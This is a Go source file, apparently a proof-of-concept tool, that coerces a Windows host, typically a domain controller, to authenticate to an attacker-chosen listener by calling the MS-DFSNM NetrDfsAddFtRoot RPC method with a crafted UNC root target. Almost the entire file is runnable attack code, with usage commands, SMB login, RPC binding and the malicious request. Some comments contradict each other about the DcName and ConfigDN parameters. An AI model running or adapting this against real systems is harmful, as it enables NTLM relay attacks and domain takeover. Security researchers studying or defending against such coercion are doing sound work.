// File name          : coerce_poc.go
// Author             : Podalirius (@podalirius_)
// Date created       : 11 Sep 2026
//
// Proof of concept for coercing authentication with MS-DFSNM::NetrDfsAddFtRoot()
// (opnum 10), written with the TheManticoreProject libraries:
//
//   - github.com/TheManticoreProject/goopts    for the command line parsing
//   - github.com/TheManticoreProject/Manticore for SMB, DCE/RPC and the RPC interface
//
// The target resolves the path argument it is given: passing a UNC path makes the remote
// machine account authenticate to the listener over SMB.
//
// Run it from this directory (go.mod pins the libraries):
//
//	go run coerce_poc.go --target 192.168.1.30 --listener 192.168.1.10 -d LAB.local -u user -p 'password'
//
// or build a standalone binary with:
//
//	go build -o coerce_poc coerce_poc.go
package main

import (
	"fmt"
	"math/rand"
	"os"
	"strings"

	"github.com/TheManticoreProject/Manticore/logger"
	netdfs "github.com/TheManticoreProject/Manticore/network/dcerpc/interfaces/4fc742e0-4a10-11cf-8273-00aa004ae673/3.0"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/ndr"
	"github.com/TheManticoreProject/Manticore/network/dcerpc/syntax"
	dcerpcclient "github.com/TheManticoreProject/Manticore/network/dcerpc/v5/client"
	smbclient "github.com/TheManticoreProject/Manticore/network/smb/client"
	"github.com/TheManticoreProject/Manticore/windows/credentials"
	"github.com/TheManticoreProject/Manticore/windows/guid"
	msdfsnm "github.com/TheManticoreProject/Manticore/windows/protocols/ms-dfsnm"
	"github.com/TheManticoreProject/goopts/parser"
	"golang.org/x/term"
)

var (
	// Configuration
	debug bool

	// Network settings
	target     string
	targetPort int
	pipeName   string

	// Coercion settings
	listener  string
	shareName string
	dcName    string
	configDN  string

	// Authentication details
	authDomain   string
	authUsername string
	authPassword string
	authHashes   string
	authNoPass   bool
)

func parseArgs() {
	ap := parser.ArgumentsParser{
		Banner: "Windows auth coerce using MS-DFSNM::NetrDfsAddFtRoot() - by Remi GASCOU (Podalirius) - v1.0.0",
	}

	ap.SetOptShowBannerOnHelp(true)
	ap.SetOptShowBannerOnRun(true)

	ap.NewBoolArgument(&debug, "", "--debug", false, "Enable debug mode.")

	// Network settings
	group_network, err := ap.NewArgumentGroup("Network")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_network.NewStringArgument(&target, "-t", "--target", "", true, "IP address or hostname of the target.")
		group_network.NewTcpPortArgument(&targetPort, "", "--target-port", 445, false, "Port of the SMB service on the target.")
		group_network.NewStringArgument(&pipeName, "", "--pipe", netdfs.PipeName, false, "Named pipe to bind the interface on.")
	}

	// Coercion settings
	group_coerce, err := ap.NewArgumentGroup("Coercion")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_coerce.NewStringArgument(&listener, "-l", "--listener", "", true, "IP address or hostname of the listener the target should authenticate to.")
		group_coerce.NewStringArgument(&configDN, "", "--config-dn", "", false, "DN of the DFS namespace object in the DFS Configuration Container (derived from --domain if omitted).")
		group_coerce.NewStringArgument(&dcName, "", "--dc-name", "", false, "Host name of the DC holding the DFS metadata (empty stands in for the NULL pointer the IDL allows).")
		group_coerce.NewStringArgument(&shareName, "", "--share", "", false, "Share name sent to the target (random 8 characters if omitted).")
	}

	// Authentication
	group_auth, err := ap.NewArgumentGroup("Authentication")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_auth.NewStringArgument(&authDomain, "-d", "--domain", "", false, "(FQDN) domain to authenticate to.")
		group_auth.NewStringArgument(&authUsername, "-u", "--user", "", false, "User to authenticate as.")
	}

	// Secret
	group_secret, err := ap.NewNotRequiredMutuallyExclusiveArgumentGroup("Secret")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_secret.NewBoolArgument(&authNoPass, "", "--no-pass", false, "Don't ask for a password (null session).")
		group_secret.NewStringArgument(&authPassword, "-p", "--password", "", false, "Password to authenticate with.")
		group_secret.NewStringArgument(&authHashes, "-H", "--hashes", "", false, "NT/LM hashes, format is LMhash:NThash.")
	}

	ap.Parse()
}

// NetrDfsAddFtRoot (opnum 10), as documented by [MS-DFSNM]:
//
//	NET_API_STATUS NetrDfsAddFtRoot(
//	   [in, string] WCHAR* ServerName,
//	   [in, string] WCHAR* DcName,
//	   [in, string] WCHAR* RootShare,
//	   [in, string] WCHAR* FtDfsName,
//	   [in, string] WCHAR* Comment,
//	   [in, string] WCHAR* ConfigDN,
//	   [in] BOOLEAN NewFtDfs,
//	   [in] DWORD ApiFlags,
//	   [in, out, unique] DFSM_ROOT_LIST** ppRootList
//	 );
//
// The binding handle is implicit in Go. The request/response structs below are lifted
// verbatim from Manticore's generated call for this opnum
// (network/dcerpc/interfaces/4fc742e0-4a10-11cf-8273-00aa004ae673/3.0/functions/10_NetrDfsAddFtRoot.go), which is the reviewed
// translation of that IDL; the wrapper there folds a nonzero return value into an
// error string, so the call is issued here to keep the numeric status.

// netrDfsAddFtRootRequest carries the [in] parameters of NetrDfsAddFtRoot.
type netrDfsAddFtRootRequest struct {
	ServerName ndr.WSTR
	DcName     ndr.WSTR
	RootShare  ndr.WSTR
	FtDfsName  ndr.WSTR
	Comment    ndr.WSTR
	ConfigDN   ndr.WSTR
	NewFtDfs   bool
	ApiFlags   ndr.DWORD
	PpRootList *msdfsnm.DFSM_ROOT_LIST `ndr:"unique"`
}

// netrDfsAddFtRootResponse carries the [out] parameters and return value of NetrDfsAddFtRoot.
type netrDfsAddFtRootResponse struct {
	PpRootList *msdfsnm.DFSM_ROOT_LIST `ndr:"unique"`
	Status     ndr.DWORD               `ndr:"retval"`
}

func (*netrDfsAddFtRootRequest) Opnum() uint16 { return netdfs.OpnumNetrDfsAddFtRoot }

// win32ErrorNames names the Win32 error codes ([MS-ERREF] 2.2) that this interface returns
// but that Manticore's status table for it does not cover yet. netdfs.StatusString is
// always consulted first, so the codes Manticore does define keep their names from there
// and this map only fills the gaps. ERROR_BAD_NETPATH is the one a coercion normally ends
// on: the target could not reach the UNC path — after trying to.
var win32ErrorNames = map[uint32]string{
	0x00000003: "ERROR_PATH_NOT_FOUND",
	0x00000035: "ERROR_BAD_NETPATH",
	0x00000043: "ERROR_BAD_NET_NAME",
	0x0000007b: "ERROR_INVALID_NAME",
}

// statusName resolves a Win32 status code to its constant name, preferring Manticore's
// own table. StatusString falls back to a "0x%08x" rendering for codes it does not know,
// which is how an unknown code is detected here.
func statusName(status uint32) string {
	if name := netdfs.StatusString(status); !strings.HasPrefix(name, "0x") {
		return name
	}
	if name, found := win32ErrorNames[status]; found {
		return name
	}
	return "UNKNOWN_ERROR"
}

// formatStatus renders a status as "ERROR_BAD_NETPATH (0x00000035)".
func formatStatus(status uint32) string {
	return fmt.Sprintf("%s (0x%08x)", statusName(status), status)
}

// interfaceSyntaxes returns the abstract syntaxes to try, in order. A protocol may be
// registered under several interface UUIDs and a given Windows version may only expose
// some of them, so a rejected bind is a reason to try the next candidate, not to stop.
func interfaceSyntaxes() []syntax.SyntaxID {
	var _ = guid.FromFormatD // only used when the protocol has several interface UUIDs
	candidates := []syntax.SyntaxID{netdfs.SyntaxID()}
	return candidates
}

// promptPassword asks for the password on the terminal, as the Python PoC does when a
// username is given with neither a password, hashes, nor --no-pass.
func promptPassword() (string, error) {
	fmt.Print("Password: ")
	secret, err := term.ReadPassword(int(os.Stdin.Fd()))
	fmt.Println()
	if err != nil {
		return "", err
	}
	return string(secret), nil
}

// randomName returns a random alphanumeric name, used for the share and namespace names
// this PoC invents. Nothing is created on the listener, so the names only have to be
// unlikely to collide with something that already exists on the target.
func randomName(length int) string {
	const alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	name := make([]byte, length)
	for i := range name {
		name[i] = alphabet[rand.Intn(len(alphabet))]
	}
	return string(name)
}

func main() {
	parseArgs()

	if debug {
		logger.SetLevel(logger.LevelDebug)
	}

	if authUsername != "" && authPassword == "" && authHashes == "" && !authNoPass {
		password, err := promptPassword()
		if err != nil {
			logger.Errorf("Error reading password: %s", err)
			return
		}
		authPassword = password
	}

	creds, err := credentials.NewCredentials(authDomain, authUsername, authPassword, authHashes)
	if err != nil {
		logger.Errorf("Error creating credentials: %s", err)
		return
	}

	// Negotiate the best dialect the target supports (SMB1 or SMB2+), the DCE/RPC
	// named-pipe transport is then the same for the caller either way.
	logger.Infof("Connecting to %s:%d ...", target, targetPort)
	smb, err := smbclient.Dial(target, targetPort, smbclient.Options{})
	if err != nil {
		logger.Errorf("Error connecting to %s:%d: %s", target, targetPort, err)
		return
	}
	defer smb.Disconnect()
	logger.Infof("Connected, negotiated dialect [%s]", smb.Dialect())

	if err := smb.Login(creds); err != nil {
		logger.Errorf("Error authenticating to %s: %s", target, err)
		return
	}
	defer smb.Logoff()
	logger.Infof("Authenticated as [%s]", strings.Trim(authDomain+"\\"+authUsername, "\\"))

	// Named pipes live on the IPC$ tree ([MS-RPCE] 2.1.1.2).
	if err := smb.TreeConnect("IPC$"); err != nil {
		logger.Errorf("Error connecting to share IPC$: %s", err)
		return
	}
	defer smb.TreeDisconnect()

	// A rejected bind leaves the association unusable, so every candidate syntax gets a
	// fresh pipe and client of its own.
	var rpc *dcerpcclient.Client
	for _, abstractSyntax := range interfaceSyntaxes() {
		transport, err := smb.RPCTransport(pipeName)
		if err != nil {
			logger.Errorf("Error opening pipe %s: %s", pipeName, err)
			return
		}

		logger.Infof("Binding to <%s> on %s ...", abstractSyntax, pipeName)
		candidate := dcerpcclient.NewClient(transport)
		// No SetAuth here, unlike the EFSRPC PoCs: netdfs rejects an authenticated bind
		// with bind_nak "authentication type not recognized" (0x8), so the association is
		// bound with no RPC-level security and the call runs under the identity of the SMB
		// session established above.
		if err := candidate.Bind(abstractSyntax); err != nil {
			logger.Warnf("Bind rejected: %s", err)
			candidate.Close()
			continue
		}
		logger.Info("Bind successful")
		rpc = candidate
		break
	}
	if rpc == nil {
		logger.Errorf("Could not bind the interface on %s, it is not listening on this endpoint.", pipeName)
		return
	}
	defer rpc.Close()

	// The UNC path the target will resolve, and therefore authenticate to.
	if shareName == "" {
		shareName = randomName(8)
	}
	ftDfsName := randomName(8)
	if dcName == "" {
		dcName = target
	}
	if configDN == "" {
		// CN=<namespace>,CN=Dfs-Configuration,CN=System,<domain DN> ([MS-DFSNM] 2.3.3).
		domainDN := "DC=" + strings.ReplaceAll(authDomain, ".", ",DC=")
		configDN = fmt.Sprintf("CN=%s,CN=Dfs-Configuration,CN=System,%s", ftDfsName, domainDN)
		logger.Infof("Using ConfigDN '%s'", configDN)
	}

	logger.Infof("Calling NetrDfsAddFtRoot(ServerName='%s', RootShare='%s', FtDfsName='%s') ...", listener, shareName, ftDfsName)
	logger.Infof("The target will look for the root target \\\\%s\\%s", listener, shareName)
	request := &netrDfsAddFtRootRequest{
		// The host name of the new DFS root target: the argument the server dereferences.
		ServerName: ndr.WSTR(listener),
		// MAY be NULL, otherwise the PDC of the domain ([MS-DFSNM] 3.1.4.1.10). Manticore
		// models it as a value, so an empty string stands in for the NULL pointer.
		// [in, string] WCHAR* is a [ref] pointer: NULL cannot be expressed on the wire,
		// so a real DC name is required. Defaults to the target, which is the DC in the
		// common case of coercing a domain controller.
		DcName: ndr.WSTR(dcName),
		// "The share MUST already exist": the server checks it and fails with
		// NERR_NetNameNotFound if it does not, which is the coercion.
		RootShare: ndr.WSTR(shareName),
		FtDfsName: ndr.WSTR(ftDfsName),
		Comment:   ndr.WSTR(randomName(8)),
		// The DFS namespace object entry in the DFS Configuration Container. Empty is sent
		// here because the namespace does not exist yet; the server only needs it once the
		// root target check has passed.
		// "MUST be the path of the DFS namespace object entry in the DFS Configuration
		// Container" ([MS-DFSNM] 3.1.4.1.10). An empty string is not one, and the server
		// answers ERROR_INVALID_PARAMETER; build the DN from the domain instead.
		ConfigDN: ndr.WSTR(configDN),
		NewFtDfs: true,
		// "This parameter MUST be 0" ([MS-DFSNM] 3.1.4.1.10).
		ApiFlags: 0,
		// [in, out, unique]: NULL on the way in, the server allocates the list.
		PpRootList: nil,
	}
	var response netrDfsAddFtRootResponse

	if err := rpc.Invoke(request, &response); err != nil {
		// A DCE/RPC fault means the call never reached the method: a wrong interface,
		// endpoint or parameter modelling, not a refusal by the server.
		logger.Errorf("NetrDfsAddFtRoot() faulted: %s", err)
		return
	}

	status := uint32(response.Status)
	if status == netdfs.StatusSuccess {
		logger.Infof("NetrDfsAddFtRoot() returned %s, check your listener.", formatStatus(status))
		return
	}
	// Any other status is expected: the target fails on a path it cannot reach, but it has
	// already authenticated to the listener to find that out.
	logger.Infof("NetrDfsAddFtRoot() returned a status: %s", formatStatus(status))
	logger.Info("The call was processed by the target, check your listener.")
}
